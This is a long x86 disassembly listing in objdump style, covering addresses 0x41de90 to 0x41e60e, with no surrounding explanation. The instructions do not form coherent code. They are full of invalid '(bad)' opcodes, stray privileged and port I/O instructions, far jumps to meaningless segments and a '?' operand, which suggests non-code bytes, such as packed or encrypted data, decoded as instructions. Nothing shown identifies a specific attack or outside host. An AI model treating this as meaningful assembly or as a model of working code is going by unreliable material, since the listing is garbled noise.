  41de90:	imul   eax,DWORD PTR gs:[ecx+0x70676acd],0x415aa7ff
  41de9b:	gs dec edi
  41de9d:	fdiv   DWORD PTR [edi]
  41de9f:	ror    DWORD PTR [ebx+0x33e47c71],1
  41dea5:	sar    DWORD PTR [edi],1
  41dea7:	hlt    
  41dea8:	adc    eax,0x31768428
  41dead:	sub    bh,bh
  41deaf:	xchg   ecx,eax
  41deb0:	fld    DWORD PTR [edi]
  41deb2:	dec    ebp
  41deb3:	mov    dl,0xdc
  41deb5:	lahf   
  41deb6:	(bad)  
  41deb7:	nop
  41deb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41deb9:	mov    ds:0xd51cd63a,al
  41debe:	dec    eax
  41debf:	lahf   
  41dec0:	dec    edx
  41dec1:	inc    ebx
  41dec2:	and    ch,BYTE PTR [esi+edx*4]
  41dec5:	sub    DWORD PTR [eax+edx*1-0x13e39ad8],ebp
  41decc:	push   eax
  41decd:	leave  
  41dece:	xchg   ebx,eax
  41decf:	lahf   
  41ded0:	push   ss
  41ded1:	adc    ch,BYTE PTR [ebp-0x11ed0026]
  41ded7:	cdq    
  41ded8:	or     al,0x2a
  41deda:	(bad)  
  41dedb:	hlt    
  41dedc:	popf   
  41dedd:	dec    eax
  41dede:	adc    DWORD PTR [edi+ebp*2+0x15],edx
  41dee2:	and    BYTE PTR [edi],ah
  41dee4:	or     bl,cl
  41dee6:	mov    WORD PTR [esi-0x2f],fs
  41dee9:	pop    edi
  41deea:	push   eax
  41deeb:	mov    eax,ds:0x56eb7027
  41def0:	mov    esp,0xaa309b3d
  41def5:	adc    DWORD PTR [ecx-0x4e6ffdb4],esi
  41defb:	adc    ah,BYTE PTR [ecx+0x57]
  41defe:	push   esi
  41deff:	scas   al,BYTE PTR es:[edi]
  41df00:	outs   dx,BYTE PTR ds:[esi]
  41df01:	shl    DWORD PTR [edi],0xc2
  41df04:	mov    ds:0x6b9be63f,al
  41df09:	sub    ah,bh
  41df0b:	rdmsr  
  41df0d:	pop    edx
  41df0e:	popf   
  41df0f:	adc    al,0x28
  41df11:	xchg   ebx,eax
  41df12:	xchg   edx,eax
  41df13:	loope  0x41de98
  41df15:	add    BYTE PTR [eax],ah
  41df17:	jno    0x41df77
  41df19:	out    dx,al
  41df1a:	sbb    BYTE PTR [eax-0x38bdfa3e],bh
  41df20:	lods   al,BYTE PTR ds:[esi]
  41df21:	dec    eax
  41df22:	and    ax,0x4f8d
  41df26:	push   ebp
  41df27:	mov    al,0x9f
  41df29:	sbb    cl,ah
  41df2b:	addr16 pusha 
  41df2d:	add    DWORD PTR [esi+0x6],0x99dcc846
  41df34:	jbe    0x41df53
  41df36:	imul   esi,DWORD PTR [esp+esi*1-0x95d4bb3],0xffffff9c
  41df3e:	jmp    0x41df0b
  41df40:	add    DWORD PTR [ecx+0x53],esi
  41df43:	cdq    
  41df44:	cmp    BYTE PTR [edi+0x50a83014],0x5
  41df4b:	sbb    eax,DWORD PTR [ebx+0xb]
  41df4e:	cli    
  41df4f:	aam    0x90
  41df51:	jns    0x41df87
  41df53:	fdiv   QWORD PTR [ecx+0x1490303d]
  41df59:	daa    
  41df5a:	je     0x41df79
  41df5c:	scas   eax,DWORD PTR es:[edi]
  41df5d:	jb     0x41df72
  41df5f:	mov    esp,0xf25bd4c5
  41df64:	in     eax,0x4b
  41df66:	xchg   edi,eax
  41df67:	(bad)  
  41df68:	jmp    0x41dfe6
  41df6a:	inc    ebx
  41df6b:	mov    ss,WORD PTR [edx]
  41df6d:	sub    eax,0xe00c5519
  41df72:	sbb    BYTE PTR [ecx+edx*4-0x28f8bba9],dl
  41df79:	(bad)
  41df7c:	fadd   DWORD PTR [edi]
  41df7e:	push   ss
  41df7f:	sbb    BYTE PTR [esi-0x5e0ca937],dl
  41df85:	gs push 0xf0ae9561
  41df8b:	xlat   BYTE PTR ds:[ebx]
  41df8c:	aam    0xe2
  41df8e:	or     ah,al
  41df90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df91:	dec    ecx
  41df92:	and    BYTE PTR [edx+0x26],0xa5
  41df96:	lahf   
  41df97:	pop    esi
  41df98:	jbe    0x41dfdf
  41df9a:	xor    BYTE PTR [ecx+0x75],bh
  41df9d:	inc    eax
  41df9e:	and    dl,0xa8
  41dfa1:	xchg   ebx,eax
  41dfa2:	(bad)  
  41dfa3:	mov    esi,0x7b9e0dc4
  41dfa8:	sbb    eax,DWORD PTR [edx]
  41dfaa:	and    ebp,ebp
  41dfac:	jle    0x41df3f
  41dfae:	jp     0x41e000
  41dfb0:	dec    bl
  41dfb2:	mov    ch,0x83
  41dfb4:	mov    bh,0xce
  41dfb6:	xor    edx,ebp
  41dfb8:	cmp    bl,0x6f
  41dfbb:	mov    ecx,0x82fc184f
  41dfc0:	add    al,0xea
  41dfc2:	push   esp
  41dfc3:	cs icebp 
  41dfc5:	cmc    
  41dfc6:	out    dx,eax
  41dfc7:	and    ebp,DWORD PTR [ebx+0x6be30604]
  41dfcd:	fadd   QWORD PTR [edi-0x5f]
  41dfd0:	push   ebx
  41dfd1:	aaa    
  41dfd2:	push   ebx
  41dfd3:	mov    bh,0x4f
  41dfd5:	mov    eax,ds:0xafb0dcf2
  41dfda:	xlat   BYTE PTR ds:[ebx]
  41dfdb:	adc    cl,0xe6
  41dfde:	and    BYTE PTR [edx-0x60],cl
  41dfe1:	push   eax
  41dfe2:	je     0x41dfe3
  41dfe4:	ins    BYTE PTR es:[edi],dx
  41dfe5:	lods   al,BYTE PTR ds:[esi]
  41dfe6:	in     eax,0xc8
  41dfe8:	mov    al,0x14
  41dfea:	je     0x41dfa5
  41dfec:	sbb    eax,DWORD PTR [eax-0x5abaee0e]
  41dff2:	mov    edi,0x209f8c81
  41dff7:	test   eax,0x44fbe230
  41dffc:	dec    esp
  41dffd:	sub    al,0x3a
  41dfff:	lods   al,BYTE PTR ds:[esi]
  41e000:	dec    esi
  41e001:	xchg   edx,esi
  41e003:	pop    ecx
  41e004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e005:	fisttp DWORD PTR [ebx+0x21]
  41e008:	fbld   TBYTE PTR ds:0x9ad1903e
  41e00e:	mov    WORD PTR [eax+ecx*4-0x65],?
  41e012:	jbe    0x41e079
  41e014:	out    0x6c,eax
  41e016:	loop   0x41dfb3
  41e018:	pushf  
  41e019:	sub    ebx,DWORD PTR [edi]
  41e01b:	out    dx,eax
  41e01c:	inc    edi
  41e01d:	inc    BYTE PTR [eax-0x29]
  41e020:	mov    ecx,0xaf627df4
  41e025:	neg    BYTE PTR [ebx-0x3b]
  41e028:	(bad)  
  41e029:	pop    edx
  41e02a:	mov    bh,0xf6
  41e02c:	push   ss
  41e02d:	cmp    al,0x8a
  41e02f:	add    eax,0xffffffe5
  41e032:	adc    ecx,DWORD PTR [esi+0x42110e7e]
  41e038:	or     dl,BYTE PTR [ecx+0x1126c547]
  41e03e:	sub    BYTE PTR [esp+ecx*8],ch
  41e041:	dec    esp
  41e042:	sbb    DWORD PTR [eax-0x5e60107],edi
  41e048:	fmulp  st(4),st
  41e04a:	xor    bl,BYTE PTR [ecx-0x524016e5]
  41e050:	xor    edi,DWORD PTR [ebp-0x19a440d3]
  41e056:	outs   dx,BYTE PTR ds:[esi]
  41e057:	mov    edi,0x31ecba59
  41e05c:	popa   
  41e05d:	jmp    0x41e086
  41e05f:	cmp    BYTE PTR [edi],dh
  41e061:	(bad)
  41e064:	repz cmp ah,0xe0
  41e068:	and    eax,0x7e48d534
  41e06d:	lock aas 
  41e06f:	popa   
  41e070:	or     al,0x9
  41e072:	xchg   DWORD PTR [bx+di],ecx
  41e075:	cmp    eax,0xeb96b207
  41e07a:	mov    eax,0x407c5406
  41e07f:	or     al,0x4f
  41e081:	fistp  DWORD PTR [eax]
  41e083:	into   
  41e084:	push   esi
  41e085:	stos   DWORD PTR es:[edi],eax
  41e086:	add    ah,BYTE PTR [ebx]
  41e088:	and    bl,BYTE PTR [edi+ecx*8-0x11bc8291]
  41e08f:	sub    al,0xf1
  41e091:	jns    0x41e0c7
  41e093:	jl     0x41e015
  41e095:	push   ds
  41e096:	jae    0x41e08f
  41e098:	xchg   ebx,eax
  41e099:	into   
  41e09a:	lock push ebx
  41e09c:	repnz pop esp
  41e09e:	in     al,dx
  41e09f:	test   eax,0xf4810c08
  41e0a4:	mov    dh,0xd0
  41e0a6:	nop    DWORD PTR [ebx-0x59]
  41e0aa:	fstp   DWORD PTR [esi+0x2f]
  41e0ad:	iret   
  41e0ae:	mov    dh,BYTE PTR [ebx-0x255b2596]
  41e0b4:	push   eax
  41e0b5:	or     DWORD PTR [eax-0x46e488e7],0x31
  41e0bc:	fwait
  41e0bd:	stc    
  41e0be:	push   eax
  41e0bf:	jno    0x41e13a
  41e0c1:	rcl    cl,cl
  41e0c3:	xor    al,0x4d
  41e0c5:	test   eax,0x8f8d92a9
  41e0ca:	fldenv [esi]
  41e0cc:	inc    edi
  41e0cd:	mov    ds:0x8e891a44,eax
  41e0d2:	idiv   BYTE PTR [esi]
  41e0d4:	gs push ebx
  41e0d6:	mov    dl,0x22
  41e0d8:	lock xchg ecx,eax
  41e0da:	ja     0x41e0ab
  41e0dc:	out    0xda,eax
  41e0de:	sub    DWORD PTR [edi+0x6c],eax
  41e0e1:	scas   al,BYTE PTR es:[edi]
  41e0e2:	adc    edi,DWORD PTR [edi]
  41e0e4:	jns    0x41e0bd
  41e0e6:	cmc    
  41e0e7:	in     eax,dx
  41e0e8:	mov    ds:0x5ae42a21,eax
  41e0ed:	or     ebx,ebx
  41e0ef:	out    0x9b,eax
  41e0f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0f2:	mov    ds:0x1f23b14a,al
  41e0f7:	sub    BYTE PTR [edx+edi*8],0xed
  41e0fb:	gs mov ecx,0xa6bcb48
  41e101:	imul   DWORD PTR [edx]
  41e103:	xor    ch,bl
  41e105:	and    eax,DWORD PTR [ebx+0x551301b3]
  41e10b:	fiadd  DWORD PTR [ebp+0x425397ef]
  41e111:	pop    eax
  41e112:	dec    eax
  41e113:	std    
  41e114:	mov    ah,0x5e
  41e116:	and    edx,eax
  41e118:	xor    edx,DWORD PTR [esp+ebp*2+0x29144b16]
  41e11f:	push   esp
  41e120:	jge    0x41e0cf
  41e122:	push   es
  41e123:	push   eax
  41e124:	je     0x41e18c
  41e126:	jnp    0x41e189
  41e128:	nop
  41e129:	inc    edi
  41e12a:	xchg   esi,eax
  41e12b:	xor    eax,0x2cb549df
  41e130:	jmp    0x4c66:0xc35934d0
  41e137:	lds    esi,FWORD PTR [edi-0x6bb18561]
  41e13d:	int3   
  41e13e:	iret   
  41e13f:	cmp    edi,DWORD PTR [ecx]
  41e141:	repnz sti 
  41e143:	mov    ebx,0x8e29a229
  41e148:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41e14a:	mov    edi,0x8a36b049
  41e14f:	xchg   esp,eax
  41e150:	adc    al,0x7d
  41e152:	iret   
  41e153:	push   ebx
  41e154:	leave  
  41e155:	fldenv [esi+0x27]
  41e158:	mov    esi,0xe2cfc428
  41e15d:	popf   
  41e15e:	fsubr  QWORD PTR es:[ecx-0x4a8088b9]
  41e165:	add    eax,0xc2f808d5
  41e16a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e16b:	dec    eax
  41e16c:	mov    al,ds:0x58aa4cd1
  41e171:	xchg   ebx,eax
  41e172:	mov    esp,0x9ad2e33c
  41e177:	inc    ebp
  41e178:	clc    
  41e179:	inc    ebp
  41e17a:	xlat   BYTE PTR ds:[ebx]
  41e17b:	xchg   ecx,eax
  41e17c:	mov    ds:0x65151058,eax
  41e181:	and    eax,0x225f0490
  41e186:	cmp    eax,0x1f662c5c
  41e18b:	jge    0x41e1c7
  41e18d:	cwde   
  41e18e:	jmp    0x41e155
  41e190:	(bad)  [ebp+0x69319f5]
  41e196:	xor    eax,0x21182c33
  41e19b:	add    al,0xa7
  41e19d:	cmp    eax,0xbef02d80
  41e1a2:	adc    ecx,DWORD PTR [ebp+0x33cd3948]
  41e1a8:	in     al,0x2f
  41e1aa:	dec    esi
  41e1ab:	lods   eax,DWORD PTR ds:[esi]
  41e1ac:	jle    0x41e141
  41e1ae:	sub    eax,DWORD PTR es:[ecx]
  41e1b1:	xchg   ebp,eax
  41e1b2:	rcr    BYTE PTR [esi-0x4edc011a],cl
  41e1b8:	rcr    BYTE PTR [ebx+0x62],1
  41e1bb:	mov    ds:0xca918a0f,eax
  41e1c0:	nop
  41e1c1:	aad    0x6b
  41e1c3:	add    bh,BYTE PTR fs:[edi]
  41e1c6:	sub    eax,0x9bc5f144
  41e1cb:	popf   
  41e1cc:	repz sub al,0x5a
  41e1cf:	not    esp
  41e1d1:	icebp  
  41e1d2:	jg     0x41e18d
  41e1d4:	or     ah,ah
  41e1d6:	fs out 0x51,al
  41e1d9:	into   
  41e1da:	adc    eax,0x83e6f70e
  41e1df:	jno    0x41e19b
  41e1e1:	(bad)  
  41e1e2:	and    eax,0xe29f8d4d
  41e1e7:	pop    ebp
  41e1e8:	jle    0x41e225
  41e1ea:	aaa    
  41e1eb:	sub    BYTE PTR [edi+0x50],0xaa
  41e1ef:	add    esi,DWORD PTR [ebp+0x6a]
  41e1f2:	inc    esp
  41e1f3:	jge    0x41e1be
  41e1f5:	inc    ecx
  41e1f6:	mov    ch,0x10
  41e1f8:	mov    ds:0x3fbf209e,eax
  41e1fd:	cmp    ah,BYTE PTR [esi]
  41e1ff:	xor    esi,DWORD PTR [edi+0x7aeff287]
  41e205:	inc    ecx
  41e206:	daa    
  41e207:	lods   eax,DWORD PTR ds:[esi]
  41e208:	jo     0x41e231
  41e20a:	mov    fs,WORD PTR [esi]
  41e20c:	mov    eax,0x24d883bd
  41e211:	call   0x1b9c:0xa716d9bb
  41e218:	pushf  
  41e219:	pop    ecx
  41e21a:	jae    0x41e1c4
  41e21c:	sub    al,0xdb
  41e21e:	adc    al,0x8
  41e220:	mov    ecx,0x8626bc7c
  41e225:	add    eax,0xb686ff49
  41e22a:	mov    ecx,0x766b32b0
  41e22f:	outs   dx,BYTE PTR ds:[esi]
  41e230:	mov    al,0x14
  41e232:	cmp    al,0xf6
  41e234:	fsub   DWORD PTR [edi-0x2c719dd3]
  41e23a:	fyl2xp1 
  41e23c:	add    DWORD PTR [edx+0x6d73c15f],edi
  41e242:	mov    bl,0x41
  41e244:	jae    0x41e1f5
  41e246:	in     eax,0xd5
  41e248:	dec    ebp
  41e249:	fwait
  41e24a:	ja     0x41e27f
  41e24c:	dec    ecx
  41e24d:	add    BYTE PTR [edx+0x14],ch
  41e250:	mov    edx,0xf006ded0
  41e255:	push   ebp
  41e256:	sahf   
  41e257:	inc    edi
  41e258:	add    al,0xe8
  41e25a:	and    DWORD PTR [edi-0x3c],0x722d02d2
  41e261:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e263:	adc    esi,ecx
  41e265:	push   ecx
  41e266:	mov    ebp,0x845ce40b
  41e26b:	mov    esi,0x438288c1
  41e270:	clts   
  41e272:	adc    eax,0x5eaace6
  41e277:	fnop   
  41e279:	iret   
  41e27a:	jmp    0x94c:0x8c0bedcb
  41e281:	dec    esi
  41e282:	rcl    BYTE PTR [ebx+eax*2],0x29
  41e286:	push   es
  41e287:	or     bh,bh
  41e289:	rol    DWORD PTR [edx],1
  41e28b:	push   edx
  41e28c:	jno    0x41e2f8
  41e28e:	cmp    ebx,esp
  41e290:	push   ss
  41e291:	mov    ebx,0xbbaf4b0e
  41e296:	(bad)  [eax-0x40]
  41e299:	inc    edi
  41e29a:	cmp    eax,0xdc4d9f36
  41e29f:	ins    BYTE PTR es:[edi],dx
  41e2a0:	or     ch,BYTE PTR [ebx-0x4f]
  41e2a3:	xor    al,0xec
  41e2a5:	xor    al,0x32
  41e2a7:	or     BYTE PTR [edi],dl
  41e2a9:	(bad)  
  41e2aa:	sub    al,0x1f
  41e2ac:	push   es
  41e2ad:	cwde   
  41e2ae:	sub    al,0x3c
  41e2b0:	pop    edx
  41e2b1:	xchg   ebp,eax
  41e2b2:	sahf   
  41e2b3:	adc    DWORD PTR [ebx-0x50],esp
  41e2b6:	aad    0xa7
  41e2b8:	jl     0x41e31b
  41e2ba:	imul   esp,DWORD PTR [esi],0x8673d6ea
  41e2c0:	addr16 push 0xffffff8d
  41e2c3:	or     al,0x8b
  41e2c5:	out    0xd5,eax
  41e2c7:	(bad)  
  41e2c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2c9:	shl    BYTE PTR [ebp+0x3a],0x4d
  41e2cd:	push   esp
  41e2ce:	data16 out dx,al
  41e2d0:	sbb    al,0x3b
  41e2d2:	or     DWORD PTR [ebx],ebp
  41e2d4:	xor    DWORD PTR [esi],edi
  41e2d6:	pop    ds
  41e2d7:	inc    BYTE PTR [ebp+0x3e]
  41e2da:	mov    ch,0x15
  41e2dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2dd:	(bad)  
  41e2df:	mov    BYTE PTR [ecx-0x3bc5028d],cl
  41e2e5:	push   eax
  41e2e6:	clc    
  41e2e7:	bswap  ebp
  41e2e9:	jb     0x41e341
  41e2eb:	push   ss
  41e2ec:	mov    ds:0x43e9f5c0,al
  41e2f1:	(bad)
  41e2f5:	add    ah,bh
  41e2f7:	rcl    DWORD PTR [ebp+0x77b6e549],cl
  41e2fd:	call   0x41e788e9
  41e302:	hlt    
  41e303:	jl     0x41e2ee
  41e305:	xor    eax,0x70c6213e
  41e30a:	das    
  41e30b:	mov    ch,0x7f
  41e30d:	add    al,0x6c
  41e30f:	sbb    DWORD PTR [eax],eax
  41e311:	pop    edx
  41e312:	xlat   BYTE PTR ds:[ebx]
  41e313:	and    BYTE PTR [ecx],0x5e
  41e316:	add    dh,BYTE PTR [esi]
  41e318:	adc    ecx,ebx
  41e31a:	mov    ds:0x5707e007,eax
  41e31f:	jp     0x41e2d6
  41e321:	jb     0x41e2e6
  41e323:	movd   mm0,ebp
  41e326:	jge    0x41e2fc
  41e328:	das    
  41e329:	mov    ebx,0x8b9b4d35
  41e32e:	scas   al,BYTE PTR es:[edi]
  41e32f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e330:	xchg   ecx,eax
  41e331:	retf   
  41e332:	cli    
  41e333:	dec    ax
  41e335:	push   cs
  41e336:	not    BYTE PTR [esi]
  41e338:	inc    esp
  41e339:	jl     0x41e319
  41e33b:	inc    ecx
  41e33c:	(bad)  [ebx+0x54]
  41e33f:	dec    esp
  41e340:	dec    esi
  41e341:	adc    bl,ah
  41e343:	fmul   DWORD PTR [ebx-0x6ff56d1d]
  41e349:	mov    ecx,0xa1acd571
  41e34e:	mov    BYTE PTR [ebp-0x5c],bl
  41e351:	iret   
  41e352:	aaa    
  41e353:	sbb    ch,bl
  41e355:	aam    0xb8
  41e357:	aad    0xde
  41e359:	push   ecx
  41e35a:	inc    eax
  41e35b:	retf   
  41e35c:	cmp    al,0xae
  41e35e:	pop    ebp
  41e35f:	pop    ecx
  41e360:	mov    cl,0x1b
  41e362:	push   eax
  41e363:	into   
  41e364:	imul   bl
  41e366:	pusha  
  41e367:	aas    
  41e368:	out    0x75,al
  41e36a:	mov    ebx,0xb443707e
  41e36f:	sub    ebp,edx
  41e371:	push   ebx
  41e372:	daa    
  41e373:	mov    eax,ds:0xb8a35907
  41e378:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e379:	(bad)  
  41e37a:	int3   
  41e37b:	mov    bh,0x82
  41e37d:	ins    BYTE PTR es:[edi],dx
  41e37e:	sbb    eax,0x841236ff
  41e383:	mov    ds:0x75e2254b,eax
  41e388:	or     al,0xba
  41e38a:	jl     0x41e3ec
  41e38c:	fsub   DWORD PTR [esi+0x1c53903f]
  41e392:	or     BYTE PTR [esi-0x2e],bl
  41e395:	mov    dl,0x5e
  41e397:	add    esp,DWORD PTR [esp]
  41e39a:	jge    0x41e394
  41e39c:	ss ret 0x8090
  41e3a0:	lods   al,BYTE PTR ds:[esi]
  41e3a1:	jnp    0x41e37b
  41e3a3:	xor    DWORD PTR [edx+ebp*1],0x907804a7
  41e3aa:	clc    
  41e3ab:	and    DWORD PTR ds:0xb974379b,eax
  41e3b1:	pop    edi
  41e3b2:	aas    
  41e3b3:	mov    dh,0xd3
  41e3b5:	adc    eax,DWORD PTR [edx]
  41e3b7:	push   0xfcfcb13d
  41e3bc:	mov    bl,0xc0
  41e3be:	iret   
  41e3bf:	sar    ecx,0xd9
  41e3c2:	inc    edi
  41e3c3:	cmp    DWORD PTR [edx-0x7eacafab],eax
  41e3c9:	fild   WORD PTR [edx]
  41e3cb:	mov    ch,0xee
  41e3cd:	call   0x4f0c:0x8af5c572
  41e3d4:	add    bh,BYTE PTR [ecx]
  41e3d6:	lock adc DWORD PTR [ecx-0xb],esi
  41e3da:	(bad)  
  41e3db:	cli    
  41e3dc:	aad    0xea
  41e3de:	(bad)  
  41e3df:	xor    eax,0x693c0781
  41e3e4:	retf   0x6b21
  41e3e7:	jp     0x41e41d
  41e3e9:	sahf   
  41e3ea:	adc    edx,ecx
  41e3ec:	loop   0x41e3db
  41e3ee:	das    
  41e3ef:	js     0x41e3a0
  41e3f1:	pop    ss
  41e3f2:	or     bh,BYTE PTR [ebp-0x3a]
  41e3f5:	sub    DWORD PTR [esi-0x6461c70],eax
  41e3fb:	loop   0x41e46c
  41e3fd:	sub    bl,ch
  41e3ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e400:	call   0xa19d:0x87382bcd
  41e407:	sub    al,0x5
  41e409:	inc    ebx
  41e40a:	stos   BYTE PTR es:[edi],al
  41e40b:	xlat   BYTE PTR ds:[ebx]
  41e40c:	inc    DWORD PTR [eax-0x496b473f]
  41e412:	scas   eax,DWORD PTR es:[edi]
  41e413:	adc    DWORD PTR [edx+ebx*2],ebp
  41e416:	(bad)  [ebx+0xda54320]
  41e41c:	(bad)  
  41e41d:	loope  0x41e452
  41e41f:	jmp    0xb4ad:0x3afa6317
  41e426:	int    0x16
  41e428:	les    ecx,FWORD PTR [eax+0x552e991]
  41e42e:	int3   
  41e42f:	jns    0x41e492
  41e431:	and    eax,0x4d551acf
  41e436:	or     DWORD PTR ds:0x287407ef,eax
  41e43c:	push   ebx
  41e43d:	xlat   BYTE PTR ds:[ebx]
  41e43e:	and    eax,edi
  41e440:	xor    DWORD PTR [edi+esi*8-0x653dc08d],0xffffffef
  41e448:	pop    es
  41e449:	xchg   ebp,eax
  41e44a:	daa    
  41e44b:	out    dx,al
  41e44c:	retf   0x59dc
  41e44f:	push   0xffffffe9
  41e451:	inc    esp
  41e452:	dec    esi
  41e453:	fldcw  WORD PTR [esp+ebp*2+0x1f]
  41e457:	jmp    0x5c9d174c
  41e45c:	mov    al,0x60
  41e45e:	cwde   
  41e45f:	sub    al,0x9
  41e461:	lahf   
  41e462:	cs icebp 
  41e464:	sub    edx,DWORD PTR [edx+edi*8]
  41e467:	sahf   
  41e468:	sbb    al,0x41
  41e46a:	ins    DWORD PTR es:[edi],dx
  41e46b:	nop
  41e46c:	inc    esp
  41e46d:	bswap  edi
  41e46f:	mov    ebp,0xf1599c77
  41e474:	cmp    eax,0x69e19d74
  41e479:	mov    ebx,0xe63f16cb
  41e47e:	xor    cl,dh
  41e480:	mov    ah,0x4
  41e482:	int3   
  41e483:	jmp    0x41e4ac
  41e485:	test   al,0x9
  41e487:	cmp    DWORD PTR [edi-0x76ab53cc],edx
  41e48d:	icebp  
  41e48e:	mov    ds:0xebf6b2ed,al
  41e493:	or     BYTE PTR [edi+0x5c14d2e1],bh
  41e499:	jl     0x41e45f
  41e49b:	or     ebx,ecx
  41e49d:	cmp    ebp,eax
  41e49f:	dec    ecx
  41e4a0:	je     0x41e4b7
  41e4a2:	fs dec esi
  41e4a4:	pop    edi
  41e4a5:	sbb    DWORD PTR [edx],0xf783f018
  41e4ab:	addr16 mov bh,0x30
  41e4ae:	jle    0x41e49e
  41e4b0:	sub    eax,0x87c32ee2
  41e4b5:	stos   DWORD PTR es:[edi],eax
  41e4b6:	scas   eax,DWORD PTR es:[edi]
  41e4b7:	mov    eax,0xd37975af
  41e4bc:	repz shl DWORD PTR [esi-0x18],0xdc
  41e4c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4c2:	mov    eax,DWORD PTR [esi+0x738616dc]
  41e4c8:	mov    esp,0xe4d07dd1
  41e4cd:	mov    ecx,ebx
  41e4cf:	clc    
  41e4d0:	sbb    BYTE PTR [ecx],bl
  41e4d2:	popa   
  41e4d3:	imul   edi,DWORD PTR [eax],0xfffffffb
  41e4d6:	mov    cx,0x59c6
  41e4da:	rol    BYTE PTR [ebx+0x3c],0x60
  41e4de:	fbld   TBYTE PTR [eax]
  41e4e0:	push   ss
  41e4e1:	mov    ecx,0x3ac5e51d
  41e4e6:	mov    ecx,DWORD PTR [edi+esi*8]
  41e4e9:	sti    
  41e4ea:	and    eax,0x8dd2af72
  41e4ef:	pop    ecx
  41e4f0:	fld    st(1)
  41e4f2:	cmp    al,0x18
  41e4f4:	cmp    al,0xfc
  41e4f6:	fidivr DWORD PTR [ebp+eax*8+0x69]
  41e4fa:	inc    esp
  41e4fb:	loope  0x41e543
  41e4fd:	popa   
  41e4fe:	leave  
  41e4ff:	cs lock inc edx
  41e502:	(bad)  
  41e503:	fst    DWORD PTR ss:[esi-0x61ac00a]
  41e50a:	(bad)  [ecx-0x7]
  41e50d:	inc    ecx
  41e50e:	xchg   edi,eax
  41e50f:	pop    esi
  41e510:	jmp    0x2cb:0x551f
  41e516:	add    al,BYTE PTR [ebp+0x2239b0da]
  41e51c:	push   es
  41e51d:	in     al,0xb7
  41e51f:	or     eax,0x33647780
  41e524:	arpl   WORD PTR [ebp+0x29ab7826],si
  41e52a:	or     DWORD PTR [esp+edi*1],edx
  41e52d:	call   0x49fb2172
  41e532:	push   0xffffffc4
  41e534:	data16 je 0x41e4e4
  41e537:	shl    BYTE PTR [ecx],cl
  41e539:	mov    esp,0x1cdecd67
  41e53e:	mov    bh,0x4e
  41e540:	stos   DWORD PTR es:[edi],eax
  41e541:	neg    BYTE PTR [esp+esi*8+0x6739fc5f]
  41e548:	in     al,dx
  41e549:	push   es
  41e54a:	sbb    BYTE PTR ds:0x5ddee359,cl
  41e550:	fist   WORD PTR [ebx-0x45a24e30]
  41e556:	cmp    BYTE PTR [esi-0x78],bl
  41e559:	inc    edi
  41e55a:	push   edi
  41e55b:	ret    
  41e55c:	inc    ebp
  41e55d:	out    0xd,eax
  41e55f:	push   ecx
  41e560:	lea    ebx,[edx-0x3b]
  41e563:	cmc    
  41e564:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e565:	add    ch,BYTE PTR [edi]
  41e567:	xor    al,0x5d
  41e569:	pop    ss
  41e56a:	cmp    al,0x3
  41e56c:	clc    
  41e56d:	xor    bh,al
  41e56f:	bound  esp,QWORD PTR [ebx-0x33]
  41e572:	jge    0x41e563
  41e574:	rcl    BYTE PTR ds:0x6fb93387,cl
  41e57a:	inc    edi
  41e57b:	iret   
  41e57c:	push   ebp
  41e57d:	mov    ecx,0xc7907d1a
  41e582:	jmp    0x41e595
  41e584:	lahf   
  41e585:	bound  ebx,QWORD PTR [edx]
  41e587:	shl    dl,cl
  41e589:	in     eax,dx
  41e58a:	xchg   BYTE PTR [ecx],dl
  41e58c:	cmp    al,0x47
  41e58e:	pop    edi
  41e58f:	lds    ebx,FWORD PTR [ebp*2-0x3b8e7a40]
  41e596:	inc    eax
  41e597:	mov    WORD PTR [ecx+0x1],es
  41e59a:	and    eax,0x40d76739
  41e59f:	rcr    bh,0x98
  41e5a2:	add    edx,eax
  41e5a4:	stos   DWORD PTR es:[edi],eax
  41e5a5:	sub    ecx,DWORD PTR [edx+0x42]
  41e5a8:	out    0xf8,al
  41e5aa:	mov    ah,0xd1
  41e5ac:	pop    esi
  41e5ad:	add    BYTE PTR [ebp+0x7bdf167d],dh
  41e5b3:	popfw  
  41e5b5:	push   edx
  41e5b6:	ja     0x41e634
  41e5b8:	xchg   edx,eax
  41e5b9:	test   DWORD PTR [edx+ebp*1],ecx
  41e5bc:	clc    
  41e5bd:	test   al,0x4a
  41e5bf:	and    BYTE PTR [eax+0x37],0x64
  41e5c3:	sar    BYTE PTR [edx],cl
  41e5c5:	cld    
  41e5c6:	cmp    ebp,DWORD PTR [esp+edi*4+0x754e18e5]
  41e5cd:	mov    ch,0xd1
  41e5cf:	ds ins BYTE PTR es:[edi],dx
  41e5d1:	push   ebp
  41e5d2:	sar    dl,0x7f
  41e5d5:	add    al,0x4
  41e5d7:	pop    ebx
  41e5d8:	and    cx,0x5a
  41e5dc:	pop    ebp
  41e5dd:	out    0xf7,eax
  41e5df:	jnp    0x41e65d
  41e5e1:	mov    ch,0x66
  41e5e3:	iret   
  41e5e4:	in     al,dx
  41e5e5:	jl     0x41e61e
  41e5e7:	out    0x95,al
  41e5e9:	mov    ah,0xb8
  41e5eb:	pop    ebx
  41e5ec:	div    ah
  41e5ee:	and    al,dh
  41e5f0:	inc    edx
  41e5f1:	xor    al,0x56
  41e5f3:	loopne 0x41e5f5
  41e5f5:	push   ecx
  41e5f6:	mov    edx,0x33135c77
  41e5fb:	pop    eax
  41e5fc:	mov    bl,0x1d
  41e5fe:	pop    ebx
  41e5ff:	and    BYTE PTR [edi+esi*2-0x1eceb3d0],ch
  41e606:	mov    ss:0x5164337b,eax
  41e60c:	add    esp,DWORD PTR [esi]
  41e60e:	jl     0x41e649
